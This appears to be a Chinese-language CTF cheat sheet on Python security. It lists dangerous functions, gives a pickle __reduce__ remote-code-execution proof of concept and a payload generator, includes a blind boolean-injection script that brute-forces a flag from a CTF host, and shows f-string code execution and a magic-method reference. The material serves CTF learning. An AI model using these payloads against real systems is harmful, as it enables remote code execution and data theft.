# Python

## 攻击面

```python
eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen,platform.popen
```

## Pickle

### RCE
poc

```python
class Exploit(object):
    def __reduce__(self):
        return (os.system,('ls',))
```

利用脚本

```python
import _pickle as cPickle
import sys
import base64

COMMAND = sys.argv[1]

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

print(base64.b64encode(cPickle.dumps(PickleRce())))
```

## repr() 函数将对象转化为供解释器读取的形式

可以与php serialize()类比

## opcode 的一些操作

输出opcode表

```python
import pickletools
import prettytable
 
opcode_table = prettytable.PrettyTable()
opcode_table.field_names = ['Name', 'Code', 'Docs']
for opcode in pickletools.opcodes:
    opcode_table.add_row([opcode.name, opcode.code, opcode.doc.splitlines()[0]])
    
print(opcode_table)
```

```
+------------------+------+-----------------------------------------------------------------+
|       Name       | Code |                               Docs                              |
+------------------+------+-----------------------------------------------------------------+
|       INT        |  I   |                     Push an integer or bool.                    |
|      BININT      |  J   |                 Push a four-byte signed integer.                |
|     BININT1      |  K   |                Push a one-byte unsigned integer.                |
|     BININT2      |  M   |                Push a two-byte unsigned integer.                |
|       LONG       |  L   |                       Push a long integer.                      |
|      LONG1       |      |               Long integer using one-byte length.               |
|      LONG4       |      |              Long integer using found-byte length.              |
|      STRING      |  S   |                   Push a Python string object.                  |
|    BINSTRING     |  T   |                   Push a Python string object.                  |
| SHORT_BINSTRING  |  U   |                   Push a Python string object.                  |
|     BINBYTES     |  B   |                   Push a Python bytes object.                   |
|  SHORT_BINBYTES  |  C   |                   Push a Python bytes object.                   |
|    BINBYTES8     |      |                   Push a Python bytes object.                   |
|    BYTEARRAY8    |      |                 Push a Python bytearray object.                 |
|   NEXT_BUFFER    |      |                Push an out-of-band buffer object.               |
| READONLY_BUFFER  |      |                    Push True onto the stack.                    |
|     NEWFALSE     |      |                    Push False onto the stack.                   |
|     UNICODE      |  V   |               Push a Python Unicode string object.              |
| SHORT_BINUNICODE |      |               Push a Python Unicode string object.              |
|    BINUNICODE    |  X   |               Push a Python Unicode string object.              |
|   BINUNICODE8    |      |               Push a Python Unicode string object.              |
|      FLOAT       |  F   |            Newline-terminated decimal float literal.            |
|     BINFLOAT     |  G   |        Float stored in binary form, with 8 bytes of data.       |
|    EMPTY_LIST    |  ]   |                       Push an empty list.                       |
|      APPEND      |  a   |                   Append an object to a list.                   |
|     APPENDS      |  e   |            Extend a list by a slice of stack objects.           |
|       LIST       |  l   |  Build a list out of the topmost stack slice, after markobject. |
|   EMPTY_TUPLE    |  )   |                       Push an empty tuple.                      |
|      TUPLE       |  t   | Build a tuple out of the topmost stack slice, after markobject. |
|      TUPLE1      |      |     Build a one-tuple out of the topmost item on the stack.     |
|      TUPLE2      |      |     Build a two-tuple out of the top two items on the stack.    |
|      TUPLE3      |      |   Build a three-tuple out of the top three items on the stack.  |
|    EMPTY_DICT    |  }   |                       Push an empty dict.                       |
|       DICT       |  d   |  Build a dict out of the topmost stack slice, after markobject. |
|     SETITEM      |  s   |            Add a key+value pair to an existing dict.            |
|     SETITEMS     |  u   | Add an arbitrary number of key+value pairs to an existing dict. |
|    EMPTY_SET     |      |                        Push an empty set.                       |
|     ADDITEMS     |      |  Build a frozenset out of the topmost slice, after markobject.  |
|       POP        |  0   |   Discard the top stack item, shrinking the stack by one item.  |
|       DUP        |  2   |  Push the top stack item onto the stack again, duplicating it.  |
|       MARK       |  (   |                 Push markobject onto the stack.                 |
|     POP_MARK     |  1   |  Pop all the stack objects at and above the topmost markobject. |
|       GET        |  g   |      Read an object from the memo and push it on the stack.     |
|      BINGET      |  h   |      Read an object from the memo and push it on the stack.     |
|   LONG_BINGET    |  j   |      Read an object from the memo and push it on the stack.     |
|       PUT        |  p   |   Store the stack top into the memo.  The stack is not popped.  |
|      BINPUT      |  q   |   Store the stack top into the memo.  The stack is not popped.  |
|   LONG_BINPUT    |  r   |   Store the stack top into the memo.  The stack is not popped.  |
|     MEMOIZE      |      |   Store the stack top into the memo.  The stack is not popped.  |
|       EXT1       |      |                         Extension code.                         |
|       EXT2       |      |                         Extension code.                         |
|       EXT4       |      |                         Extension code.                         |
|      GLOBAL      |  c   |         Push a global object (module.attr) on the stack.        |
|   STACK_GLOBAL   |      |         Push a global object (module.attr) on the stack.        |
|      REDUCE      |  R   |   Push an object built from a callable and an argument tuple.   |
|      BUILD       |  b   |   Finish building an object, via __setstate__ or dict update.   |
|       INST       |  i   |                     Build a class instance.                     |
|       OBJ        |  o   |                     Build a class instance.                     |
|      NEWOBJ      |      |                    Build an object instance.                    |
|    NEWOBJ_EX     |      |                    Build an object instance.                    |
|      PROTO       |      |                   Protocol version indicator.                   |
|       STOP       |  .   |                   Stop the unpickling machine.                  |
|      FRAME       |      |              Indicate the beginning of a new frame.             |
|      PERSID      |  P   |          Push an object identified by a persistent ID.          |
|    BINPERSID     |  Q   |          Push an object identified by a persistent ID.          |
+------------------+------+-----------------------------------------------------------------+
```

Example:

```python
import pickle 
#import sys
import base64
import pickletools

#COMMAND = "ls"

class PickleRce(object):
    def __init__(self):
        super(PickleRce, self).__init__()
        self.id = 1
        self.name ="eki"
    #def __reduce__(self):
    #    import os
    #    return (os.system,(COMMAND,))
x = PickleRce()
s = pickle.dumps(x)

pickletools.dis(s)
```
### 参考资料

绕过 RestrictedUnpickler：http://blog.nsfocus.net/%e7%bb%95%e8%bf%87-restrictedunpickler/

从零开始python反序列化攻击：pickle原理解析 & 不用reduce的RCE姿势  https://zhuanlan.zhihu.com/p/89132768

## 字符串bool

```
>>> 'a' and True
True
>>> 'a' and False
False
>>> True and False
False
>>> 'a' or False
'a'
>>> True or False
True
>>> False or True
True
```

存在类似SQL Bool Blind的注入

```python
#coding=utf-8
import requests
import time
import sys
import string

pt= string.printable

url="http://992b9ff2-9950-49ec-8925-4fa34293d8a6.node3.buuoj.cn/"

ret = "flag{"
url = url + "cgi-bin/pycalx.py"

while True:
    l = 1
    r = 128
    while(l+1<r):
        mid = (l+r) / 2
        tmp=ret+chr(mid)
        data = {
            'value1': 'a',
            'op': '+\'',
            'value2': 'and source>FLAG#',
            'source': tmp
        }
        req=requests.post(url,data=data)
        #print req.text
        if (req.status_code != requests.codes.ok):
            continue
        if "True" in req.text:
            r=mid
        else :
            l=mid
    if(chr(l) not in pt):
        break
    ret=ret+chr(l)
    sys.stdout.write("[-]Result : -> {0} <-\r".format(ret))
    sys.stdout.flush()

print("[+]Result : ->"+ret+"<-")
```

## 浮点数比较

``float()``

``inf,nan,infinity``

## python3 ``f'{}'``

在python3.6中，将字符串用{}引起来，加上引号，并且前面加个f就可以把{}中的字符串当做代码执行

``f"{__import__('time').sleep(1)}"``

## 函数重载

python支持动态修改函数

比如

```python
__builtins__.ord=__builtins__.print
ord("1")
-> 1
```

事实上，python中的函数也是对象

python的对象有很多魔术方法

```python
__new__(cls[, ...])	1. __new__ 是在一个对象实例化的时候所调用的第一个方法
__init__(self[, ...])	构造器，当一个实例被创建的时候调用的初始化方法
__del__(self)	析构器，当一个实例被销毁的时候调用的方法
__call__(self[, args...])	允许一个类的实例像函数一样被调用：x(a, b) 调用 x.__call__(a, b)
__len__(self)	定义当被 len() 调用时的行为
__repr__(self)	定义当被 repr() 调用时的行为
__str__(self)	定义当被 str() 调用时的行为
__bytes__(self)	定义当被 bytes() 调用时的行为
__hash__(self)	定义当被 hash() 调用时的行为
__bool__(self)	定义当被 bool() 调用时的行为，应该返回 True 或 False
__format__(self, format_spec)	定义当被 format() 调用时的行为
 有关属性
__getattr__(self, name)	定义当用户试图获取一个不存在的属性时的行为
__getattribute__(self, name)	定义当该类的属性被访问时的行为
__setattr__(self, name, value)	定义当一个属性被设置时的行为
__delattr__(self, name)	定义当一个属性被删除时的行为
__dir__(self)	定义当 dir() 被调用时的行为
__get__(self, instance, owner)	定义当描述符的值被取得时的行为
__set__(self, instance, value)	定义当描述符的值被改变时的行为
__delete__(self, instance)	定义当描述符的值被删除时的行为
 比较操作符
__lt__(self, other)	定义小于号的行为：x < y 调用 x.__lt__(y)
__le__(self, other)	定义小于等于号的行为：x <= y 调用 x.__le__(y)
__eq__(self, other)	定义等于号的行为：x == y 调用 x.__eq__(y)
__ne__(self, other)	定义不等号的行为：x != y 调用 x.__ne__(y)
__gt__(self, other)	定义大于号的行为：x > y 调用 x.__gt__(y)
__ge__(self, other)	定义大于等于号的行为：x >= y 调用 x.__ge__(y)
 算数运算符
__add__(self, other)	定义加法的行为：+
__sub__(self, other)	定义减法的行为：-
__mul__(self, other)	定义乘法的行为：*
__truediv__(self, other)	定义真除法的行为：/
__floordiv__(self, other)	定义整数除法的行为：//
__mod__(self, other)	定义取模算法的行为：%
__divmod__(self, other)	定义当被 divmod() 调用时的行为
__pow__(self, other[, modulo])	定义当被 power() 调用或 ** 运算时的行为
__lshift__(self, other)	定义按位左移位的行为：<<
__rshift__(self, other)	定义按位右移位的行为：>>
__and__(self, other)	定义按位与操作的行为：&
__xor__(self, other)	定义按位异或操作的行为：^
__or__(self, other)	定义按位或操作的行为：|
 　　　　　　　　　　　　　　　　　　　　　　反运算
__radd__(self, other)	（与上方相同，当左操作数不支持相应的操作时被调用）
__rsub__(self, other)	（与上方相同，当左操作数不支持相应的操作时被调用）
__rmul__(self, other)	（与上方相同，当左操作数不支持相应的操作时被调用）
__rtruediv__(self, other)	（与上方相同，当左操作数不支持相应的操作时被调用）
__rfloordiv__(self, other)	（与上方相同，当左操作数不支持相应的操作时被调用）
__rmod__(self, other)	（与上方相同，当左操作数不支持相应的操作时被调用）
__rdivmod__(self, other)	（与上方相同，当左操作数不支持相应的操作时被调用）
__rpow__(self, other)	（与上方相同，当左操作数不支持相应的操作时被调用）
__rlshift__(self, other)	（与上方相同，当左操作数不支持相应的操作时被调用）
__rrshift__(self, other)	（与上方相同，当左操作数不支持相应的操作时被调用）
__rand__(self, other)	（与上方相同，当左操作数不支持相应的操作时被调用）
__rxor__(self, other)	（与上方相同，当左操作数不支持相应的操作时被调用）
__ror__(self, other)	（与上方相同，当左操作数不支持相应的操作时被调用）
增量赋值运算
__iadd__(self, other)	定义赋值加法的行为：+=
__isub__(self, other)	定义赋值减法的行为：-=
__imul__(self, other)	定义赋值乘法的行为：*=
__itruediv__(self, other)	定义赋值真除法的行为：/=
__ifloordiv__(self, other)	定义赋值整数除法的行为：//=
__imod__(self, other)	定义赋值取模算法的行为：%=
__ipow__(self, other[, modulo])	定义赋值幂运算的行为：**=
__ilshift__(self, other)	定义赋值按位左移位的行为：<<=
__irshift__(self, other)	定义赋值按位右移位的行为：>>=
__iand__(self, other)	定义赋值按位与操作的行为：&=
__ixor__(self, other)	定义赋值按位异或操作的行为：^=
__ior__(self, other)	定义赋值按位或操作的行为：|=
 一元操作符
__pos__(self)	定义正号的行为：+x
__neg__(self)	定义负号的行为：-x
__abs__(self)	定义当被 abs() 调用时的行为
__invert__(self)	定义按位求反的行为：~x
 类型转换
__complex__(self)	定义当被 complex() 调用时的行为（需要返回恰当的值）
__int__(self)	定义当被 int() 调用时的行为（需要返回恰当的值）
__float__(self)	定义当被 float() 调用时的行为（需要返回恰当的值）
__round__(self[, n])	定义当被 round() 调用时的行为（需要返回恰当的值）
__index__(self)	1. 当对象是被应用在切片表达式中时，实现整形强制转换
2. 如果你定义了一个可能在切片时用到的定制的数值型,你应该定义 __index__
3. 如果 __index__ 被定义，则 __int__ 也需要被定义，且返回相同的值
 	
上下文管理（with 语句）
__enter__(self)	1. 定义当使用 with 语句时的初始化行为
2. __enter__ 的返回值被 with 语句的目标或者 as 后的名字绑定
__exit__(self, exc_type, exc_value, traceback)	1. 定义当一个代码块被执行或者终止后上下文管理器应该做什么
2. 一般被用来处理异常，清除工作或者做一些代码块执行完毕之后的日常工作
 容器类型
__len__(self)	定义当被 len() 调用时的行为（返回容器中元素的个数）
__getitem__(self, key)	定义获取容器中指定元素的行为，相当于 self[key]
__setitem__(self, key, value)	定义设置容器中指定元素的行为，相当于 self[key] = value
__delitem__(self, key)	定义删除容器中指定元素的行为，相当于 del self[key]
__iter__(self)
__next__(self)	定义当迭代容器中的元素的行为
__reversed__(self)	定义当被 reversed() 调用时的行为
__contains__(self, item)	定义当使用成员测试运算符（in 或 not in）时的行为
```

## 特殊属性

``foo.func_code``
``foo.func_globals``


## 拓展资料

Hackergame2019 不同寻常的 Python 考试 ：
https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E4%B8%8D%E5%90%8C%E5%AF%BB%E5%B8%B8%E7%9A%84_Python_%E8%80%83%E8%AF%95/README.md